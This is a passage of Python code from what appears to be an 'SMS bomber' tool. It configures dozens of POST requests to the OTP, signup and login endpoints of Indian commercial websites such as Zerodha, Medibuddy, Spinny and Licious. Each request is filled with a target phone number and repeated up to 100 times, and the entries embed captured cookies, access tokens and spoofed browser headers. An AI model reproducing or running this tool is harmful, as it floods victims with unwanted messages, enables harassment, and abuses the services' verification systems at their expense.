        "data": lambda phone: f"sixDigitOTP=true&token=1f94cd26e6ace46d55cb10f0f72d29a0c080a14bdfb366d3c549f5000ce0898e514f9bc240f1b66fbf3cb97b65b74665f991767172e62de48edd47e98421d270&resendOnCall=false&prefix=%2B91&resendOnWhatsapp=false&phone={phone}",
        "count": 1
    },
    
    {
        "url": "https://api.55clubapi.com/api/webapi/SmsVerifyCode",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://55club08.in",
            "priority": "u=1, i",
            "referer": "https://55club08.in/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": f"91{phone}", "codeType": 1, "language": 0, "random": "35ae48f136d74b279dbd0eeb2504e7f8", "signature": "78A2879A0D46B65D257F9B29354B5DBA", "timestamp": 1715445820}),
        "count": 1
    },
    
    {
        "url": "https://zerodha.com/account/registration.php",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "cookie": "cf_bm=ElnS2p7cn77x_2mWXSAkw8p7DCwRqsLuicR2.A7Yix8-1715445990-1.0.1.1-3r3HzDpdeQsDlj4p6i8hpSHjARApUniHH5VucpQ.RZJ1h7A6HP4H_VTKNiG.el_XckzpYubXRY06y9nP4VedLw; _cfuvid=tQIXhAaSONoNxLn2WTlwUcLy7GvfHXcxlUX0eibyTJY-1715445990470-0.0.1.1-604800000; cf_clearance=9NQLvi9W7gmpLV24ZU7wOokjiHT81xYc1GjJ08iI0-1715446086-1.0.1.1-dUVk1GMFtkdmZ2GfVkAt5GlUzgagCLx_uiFWF1dEWb4oehts1tZSs8pCY7v8G2plkGi1d7FauCePud424H6tMw",
            "origin": "https://zerodha.com",
            "priority": "u=1, i",
            "referer": "https://zerodha.com/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-arch": '"x86"',
            "sec-ch-ua-bitness": '"64"',
            "sec-ch-ua-full-version": '"124.0.6367.202"',
            "sec-ch-ua-full-version-list": '"Chromium";v="124.0.6367.202", "Google Chrome";v="124.0.6367.202", "Not-A.Brand";v="99.0.0.0"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-model": '""',
            "sec-ch-ua-platform": '"Windows"',
            "sec-ch-ua-platform-version": '"10.0.0"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile": phone, "source": "zerodha", "partner_id": ""}),
        "count": 100
    },
    
    {
        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "cache-control": "max-age=0",
            "content-type": "application/json",
            "origin": "https://www.aakash.ac.in",
            "priority": "u=1, i",
            "referer": "https://www.aakash.ac.in/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "x-client-id": "a6fbf1d2-27c3-46e1-b149-0380e506b763"
        },
        "data": lambda phone: json.dumps({"mobile_psid": phone, "mobile_number": "", "activity_type": "aakash-myadmission", "webengageData": {"profile": "student", "whatsapp_opt_in": True, "method": "mobile"}}),
        "count": 100
    },
    
    {
        "url": "https://api.testbook.com/api/v2/mobile/signup?mobile=9856985698&clientId=1117490662.1715447223&sessionId=1715447223",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://testbook.com",
            "priority": "u=1, i",
            "referer": "https://testbook.com/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "x-tb-client": "web,1.2"
        },
        "data": lambda phone: json.dumps({"firstVisitSource": {"type": "organic", "utm_source": "google", "utm_medium": "organic", "timestamp": "2024-05-11T17:06:43.000Z", "entrance": "https://testbook.com/", "referralUrl": "https://www.google.com/"}, "signupSource": {"type": "organic", "utm_source": "google", "utm_medium": "organic", "timestamp": "2024-05-11T17:06:43.000Z", "entrance": "https://testbook.com/", "referralUrl": "https://www.google.com/"}, "mobile": phone, "signupDetails": {"page": "HomePage", "pagePath": "/", "pageType": "HomePage"}}),
        "count": 1
    },
    
    {
        "url": "https://loginprod.medibuddy.in/unified-login/user/register",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.medibuddy.in",
            "priority": "u=1, i",
            "referer": "https://www.medibuddy.in/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"source": "medibuddyInWeb", "platform": "medibuddy", "phonenumber": phone, "flow": "Retail-Login-Home-Flow", "idealLoginFlow": False, "advertiserId": "3893d117-b321-Lba9-815e-db63c64b112a", "mbUserId": None}),
        "count": 50
    },
    
    {
        "url": "https://api.spinny.com/api/c/user/otp-request/v3/",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cookie": "varnishPrefixHome=false; utm_source=organic; platform=web; _gcl_au=1.1.838974980.1715509137; _ga=GA1.1.1518972419.1715509138; _fbp=fb.1.1715509139024.1750920090; cto_bundle=pcoVZ19GWldON1ZZbnRiWjcxUW1adHJncjZIWTRRUGVXRThnVWM5WUs4ek0wanRTbEVPWm9qWiUyRmFMMlRkYlhxRDltRVJwNG1iNmhDVEVjYzZWZmRQVHhHNHZhTjlmdDdBdkdTMFBuaGg3Sktlc2duVEx0N1poZWNJWTNsWjVuTUt6JTJCak1vQUFtQ2NiTmdYJTJGdUU4N3kxM1AwTXclM0QlM0Q; _ga_WQREN8TJ7R=GS1.1.1715509138.1.1.1715509192.6.0.0",
            "origin": "https://www.spinny.com",
            "platform": "web",
            "priority": "u=1, i",
            "referer": "https://www.spinny.com/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"contact_number": phone, "whatsapp": False, "code_len": 4, "g-recaptcha-response": "03AFcWeA46Lsb5HaQXtezpeMPCnDMfDzkpcK-Q4zgi3w8ugXsZ9WStLQWSVWgh25WKbrOY2eCyC--nleXQBQ-9s8HDrqzBM6BIMDfkNpguN6krwHF3mdRTxTBEtt5NAUV8XF6VHAe2CeU4G7Qb10qUjUtEsQt4lTCa-bka2SK0VipNsIe4zP2kygDwqB5o1SyZms7t48Ku04fQmJSEJpYpi68ZXTJi7FjVyh01JLnu7ms1juztvZ7uMwMXHt4miFYAQlX9eglyPA-PKQbV8L-ILU8Z3sthWDNs6GJhDH-rnRK-ryOOAZDN2dDJd_ab4-RNj_5e8KJOruIg9uPHckSmRtm6xUVkDNjNn1fsGiQRGrAzpBmEOwRi5IEB-qFoVEEl4hFqBOLuRF386OBlfJrMJi4Cs766kprWznF8Sms9mHhU6JZA_m4H-I8zcCh3Bs4LYIZPH2iLRBqxUbGFLK-OL3_mcCLHIf3KXBD1sOFR7yithP3zw9RKDTxNjabd95yDuPLMjZpjggHKnEJY2xKekApjxMd9PlCBgm7TtcAelz5bRzugVA_-uo8ZxFzlGGnIUfqBwiCF-3Kim010z5jQCXRh39nnqXZumIomcLmcJqr-Rb71saIzr7dk4D4jXiAaxCadFSTXTDBFBpCbg3n3m331s54Sr96Qd3dPUmYMF1cgYXjimuRlUeHTEmOQXLtfO1_quzZXTKfodooPv5Hf1guiTYX9U75Fan3nvqNYLJWNKHoxZhvQsd88F9PprWh5qMg3MXs9Qz1PAtTWQHjOZnmzUvSUNYWxUg4uaYhucG1it62ncpYZpmDonvpLQyFwLfdKMJvPjyHudVfUgwR5ZIClGZVklhkCVqecbsH8K1WuQ-T5FVeNC1G2aca-pJkqG-U_2FOslhHT6W6bsX0MKr-zKZ77m-34zEQYlLpvNC2AfVng1YQbwT9unslwfuqnf_wGLKQbU9EIWTlJ__7WfanTI-XhDRbavzVcFhFfNvPweIFzgJlfaSSsWdvhZbEJ_tKVYplQ5_HHpcCvxD15cdnYKdmyr1z9LDMOMLjmuTzqneqWLU3POHwNZ6oJ_-P9qmJsCay-GqsbF8Wt3TxmgQ_2DRvj0JwVp3Yg3GB8AtPquN331LS4CzwvWNMiiPEXKpIlS9TeWSRgEdJtS9DMFyEn6pmkO22DoEkbp59BB2PtxGxtkbVG7rBOUhWtTqqBvRy6v6WCOjn2OQEREGoJKBU702UwYDmurrNimGeQCRhmTiKX-Qy3HINJmkN6FxEZulijqyBsS7CRifx8OmURflTnzpVsnJForYAe5uLm_KsJBxvC5TgMGsmlxd5Lkf1TKcCmCCC2ldo1A8RIBZ6LAvPqgLJtTPmPmX-p6NcbGOwYHESBI_ZLVN0OhiJxbVRowq72EZH7QIJX2yKUFZts6UHk_l-VccQAGvXJrCSEIpUMpIvnBCY5UU4RnfB-pqM1UvhbIneE3JbXE03zb84yasVWrt9b0NbnaQbSHGC7OBxF9yA8zBaGC1bn4riqLBHMYWewzQ3-dHcnoB8YkaXLAs3vydK7O-HO46ciPHH78CzgJykwHrgh6At5X8cT1Rlr9yIZR-GujFw3TOhOHPK9M5HmEvmUaESbRzoGbTuwhQRSA8BMqRiwKT_6aEBSbcBpBVnloSPyNHcLCqY1W1WditMKahnMZOvf0Y_G90IzfqxWkCHfQTvGBaRaAMgZTejWRHoQfqXvwXMYs32EXklZVGmAl2lzFBMiLQ", "expected_action": "login"}),
        "count": 3
    },
    
    {
        "url": "https://api.tradeindia.com/home/registration/",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "multipart/form-data; boundary=----WebKitFormBoundarypzpW5AB7AKLEX4iX",
            "cookie": "_gcl_au=1.1.1130160145.1715510372; _ga_VTLSYCYF27=GS1.1.1715510372.1.0.1715510372.60.0.0; _ga=GA1.1.996518352.1715510373; NEW_TI_SESSION_COOKIE=81C3e74991c15Fe2318Eb70fa3a3a70B",
            "origin": "https://www.tradeindia.com",
            "priority": "u=1, i",
            "referer": "https://www.tradeindia.com/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: f'------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="country_code"\r\n\r\n+91\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="phone"\r\n\r\n{phone}\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="whatsapp_update"\r\n\r\ntrue\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="name"\r\n\r\natyug\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="email"\r\n\r\ndrhufj@gmail.com\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="terms"\r\n\r\ntrue\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="co_name"\r\n\r\njoguo9igu89gu\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="pin_code"\r\n\r\n110086\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="state"\r\n\r\n\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="alpha_country_code"\r\n\r\n\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="city"\r\n\r\n\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="city_id"\r\n\r\n\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="source"\r\n\r\n{{}}\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX--\r\n',
        "count": 1
    },
    
    {
        "url": "https://www.beyoung.in/api/sendOtp.json",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "access-token": "JQ0fUq6r6dhzJHRLSdn3J6kyzNXumrEM9gy+q8456XEsQISIKfb31Wiyx/VhM84NYcBLGRVjXeU4GqYWDAJpwQ==",
            "cache-control": "no-cache",
            "content-type": "application/json;charset=UTF-8",
            "cookie": "_gcl_au=1.1.440185340.1715511785; _ga=GA1.1.1075884316.1715511787; _ga_7YP4PPR9HS=GS1.1.1715511786.1.0.1715511788.58.0.0; user_id_t=15c6486a-e8ea-4a7e-8551-2069ec30fe70; _fbp=fb.1.1715511794344.1331412975",
            "expires": "0",
            "origin": "https://www.beyoung.in",
            "pragma": "no-cache",
            "priority": "u=1, i",
            "referer": "https://www.beyoung.in/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "visitor": "477701202435772"
        },
        "data": lambda phone: json.dumps({"username": phone, "username_type": "mobile", "service_type": 0, "vid": "477701202435772"}),
        "count": 100
    },
    
    {
        "url": "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "action": "sendOTP",
            "content-type": "application/json",
            "origin": "https://wrogn.com",
            "priority": "u=1, i",
            "referer": "https://wrogn.com/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "shop_name": "wrogn-website.myshopify.com",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"username": f"+91{phone}", "type": "mobile", "domain": "wrogn.com", "recaptcha_token": ""}),
        "count": 5
    },
    
    {
        "url": "https://app.medkart.in/api/v1/auth/requestOTP?uuid=f9e75a95-e172-4922-b69c-08e1e3be9f1b",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "app-platform": "web",
            "authorization": "Bearer",
            "content-type": "application/json",
            "device_id": "6641194520998",
            "langcode": "en",
            "origin": "https://www.medkart.in",
            "priority": "u=1, i",
            "referer": "https://www.medkart.in/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile_no": phone}),
        "count": 1
    },
    
    {
        "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "isweb": "true",
            "origin": "https://mamaearth.in",
            "priority": "u=1, i",
            "referer": "https://mamaearth.in/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile": phone, "referralCode": ""}),
        "count": 10
    },
    
    {
        "url": "https://www.coverfox.com/otp/send/",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "cookie": "vt_home_visited=Yes; IS_YAHOO_NATIVE=False; landing_page_url=\"https://www.coverfox.com/\"; tracker=6f8b6312ab8e3039ed01a0c5dae0fd73; sessionid=xtymjyfi87nat0xp09g1qx0xrms9cu9l; _ga_M60LBYV2SK=GS1.1.1715591814.1.0.1715591814.0.0.0; _gid=GA1.2.190999011.1715591815; _gat_gtag_UA_236899531_1=1; _dc_gtm_UA-45524191-1=1; _ga=GA1.1.1812460515.1715591815; _ga_L1DCK356RJ=GS1.1.1715591815.1.0.1715591815.0.0.0; AWSALB=6d3J4OZjP7N26858oPfNJvxuA5e3ePcOVmaoC9PO/iRqTj3NW3qhAozavPMDSCULtHgwKjUjMmxQgqjFpUsHnDB9PYDrC8DP9V+EfrFfNsLKVTndTrLIZpCou0zd; _uetsid=8c899110110911efbeba7dac0ce54265; _uetvid=8c8aa560110911ef9e9c35a1a2c7d25c; _fbp=fb.1.1715591818489.212380246",
            "origin": "https://www.coverfox.com",
            "priority": "u=1, i",
            "referer": "https://www.coverfox.com/user-login/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        },
        "data": lambda phone: f"csrfmiddlewaretoken=5YvA2IoBS6KRJrzV93ysh0VRRvT7CagG3DO7TPu5TwZ9161xVWsEsHzL6mYfvnIA&contact={phone}",
        "count": 5
    },
    
    {
        "url": "https://www.woodenstreet.com/index.php?route=account/forgotten_popup",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "cookie": "PHPSESSID=g2toohfnh12nevqm9ugvai7vb2; utm_campaign_id=1406; source=Google; skip_mobile=true; _gcl_aw=GCL.1715593865.EAIaIQobChMIs-WXkq2KhgMVeaRmAh3JQgNHEAAYASAAEgKOVPD_BwE; _gcl_au=1.1.645456708.1715593865; _gid=GA1.2.2020750747.1715593866; _gac_UA-62640150-1=1.1715593866.EAIaIQobChMIs-WXkq2KhgMVeaRmAh3JQgNHEAAYASAAEgKOVPD_BwE; _uetsid=515109b0110e11ef924e1f3875a02587; _uetvid=515ae710110e11ef8666217de75f3cf9; _ga=GA1.1.358917175.1715593866; _fbp=fb.1.1715593868299.1718531847; login_modal_shown=yes; G_ENABLED_IDPS=google; _ga_WYJWZGFQ0J=GS1.1.1715593867.1.0.1715593882.45.0.0; modal_shown=yes",
            "origin": "https://www.woodenstreet.com",
            "priority": "u=1, i",
            "referer": "https://www.woodenstreet.com/?utm_source=Google&utm_medium=cpc&utm_campaign=14220867988&cid=EAIaIQobChMIs-WXkq2KhgMVeaRmAh3JQgNHEAAYASAAEgKOVPD_BwE&pl=&kw=wooden%20street&utm_adgroup=125331114403&gad_source=1&gclid=EAIaIQobChMIs-WXkq2KhgMVeaRmAh3JQgNHEAAYASAAEgKOVPD_BwE",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "token": "",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        },
        "data": lambda phone: f"token=&firstname=Aartd&telephone={phone}&pincode=110086&city=NORTH+WEST+DELHI&state=DELHI&cxid=NTUxOTE0&email=hdftysdrt%40gmail.com&password=%40Abvdthfuj&pagesource=onload&redirect2=&login=2&userput_otp=",
        "count": 5
    },
    
    {
        "url": "https://gomechanic.app/api/v2/send_otp",
        "method": "POST",
        "headers": {
            "Accept": "*/*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Authorization": "725ea1b774c3558a8ec01a8405334a6e50e1e822d9549d84b36a1d3bb9478a27",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Origin": "https://gomechanic.in",
            "Referer": "https://gomechanic.in/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: json.dumps({"number": phone, "source": "website", "random_id": "K6z9b"}),
        "count": 50
    },
    
    {
        "url": "https://homedeliverybackend.mpaani.com/auth/send-otp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en",
            "client-code": "vulpix",
            "content-type": "application/json",
            "origin": "https://www.lovelocal.in",
            "priority": "u=1, i",
            "referer": "https://www.lovelocal.in/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A/Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone_number": phone, "role": "CUSTOMER"}),
        "count": 50
    },
    
    {
        "url": "https://www.tyreplex.com/includes/ajax/gfend.php",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "PHPSESSID=t2p0nhdq0lr9urakmratq4nd1o; _gcl_au=1.1.1418022926.1715621870; _gid=GA1.2.1238691204.1715621871; _gat_UA-144475494-1=1; gads=ID=f63744b23745a70c:T=1715621871:RT=1715621871:S=ALNI_MZBf13VT4bNVBfKOHbiZhJ3r9u5yA; gpi=UID=00000e1a8fc4f354:T=1715621871:RT=1715621871:S=ALNI_MYs8bPQMcoLAM5g-TX_h9lYl29HMA; __eoi=ID=8128f50e3278b1a5:T=1715621871:RT=1715621871:S=AA-AfjYrJcEbaBWGnMYqCRZith_o; dyn_cookie=true; v_type_id=3; _ga=GA1.2.110565510.1715621871; utm_source=Direct; firstUTMParamter=Direct#null#null; lastUTMParamter=Direct#null#null; landing_url=https://www.tyreplex.com/login; la_abbr=LOGIN; la_abbr_d=Login Page; la_c=login; la_default_city_id=1630; la_default_pincode=110001; la_default_pincode_display=110001, New Delhi; la_load_more_after_records=8; la_ajax_load_more_records=8; la_match_v_variants=; pv_abbr=LOGIN; pv_abbr_d=Login Page; pv_c=login; pv_default_city_id=1630; pv_default_pincode=110001; pv_default_pincode_display=110001, New Delhi; pv_load_more_after_records=8; pv_ajax_load_more_records=8; pv_match_v_variants=; _fbp=fb.1.1715621882325.2109963301; _ga_K6EJPW0E8D=GS1.1.1715621871.1.1.1715621890.41.0.0; city_id=1630; default_city_id=1630; pincode=110086; manual_city_selected=1",
            "Origin": "https://www.tyreplex.com",
            "Referer": "https://www.tyreplex.com/login",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: f"perform_action=sendOTP&mobile_no={phone}&action_type=order_login",
        "count": 1
    },
    
    {
        "url": "https://www.licious.in/api/login/signup",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cookie": "source=website; nxt=eyJjaXBoZXJ0ZXh0IjoiNmtJWEowNHA0VnRLQ3Faa0NudDBOR2R2SVpLWllmV3RSWkVpMW9DUFkxcz0iLCJpdiI6IjI3NmU4MmJiNGViMTYzN2JiNzdlMWE0NWJlODlmNmUyIiwic2FsdCI6ImIxOWQ3N2I3MzdjMDI0ODg1NjI1ZDUwOTVmZjg5M2ZjYzQyOGZjZTFjMGEzYzc0MjRmNmJiNGFjY2Q3MDJhMTAwNzNiNTIyYTU5MGFmNWJkN2ZjNTYxZTIxOGI4MzgzZDk5NTJiNzRjNGM1ZGU0NGY4ZDM3YzhmOWYyYmRmMzBiM2JhYWFlZTY3YjEwY2U3MjM3MGQ0ZThhZTkzMmMxMTlhZTM5ZGI3MzViZGEwMjgwMzY3NzlkYzllMzI0MDljYmNmOWNhYzA1NmVlNjI0NWQ5NDU2ZDIwMWEyOWYwMjNjNDI4MGI0MjBhYjY4YmNkZGY0YzJjYjQ4YmQ1ZGUwMzYwNzQwOTRhNmYxMTI5NWI1ZDU3MDM5ZWQyZmZhMTQ0ZjFmYTBiOGQ1ZTE1OTQ4ZjYxYTA0OWQ5NjllYTc1ZDY5MmU3MWIyMmRlZDhiOGVlMThlYzU0MDY1NmY2ZjE4ODY1MmY5YWQ1OGMxYjFmMjk4MDNlODg2YjZkOWY0OTIwYjUzOGMwOTY5YTM4MGFjMjQzZjMxNGQzYjM1ZTg1MWI3MDRiYTI0MjI4ZDM1YzE4ODE5YTZmYjliYzA4NTkwMWY3MGUxM2ZjMmJkYTk4Njc2ZGI3OWEzNmFjNDc4ZGE1YzdhYTA2MWJlMmFiOTJhNTYxYmU2ZTA5NDQ2MmI5NjQwIiwiaXRlcmF0aW9ucyI6OTk5fQ==; _gid=GA1.2.1985917922.1715943256; _gcl_au=1.1.1244050996.1715943259; _gat=1; 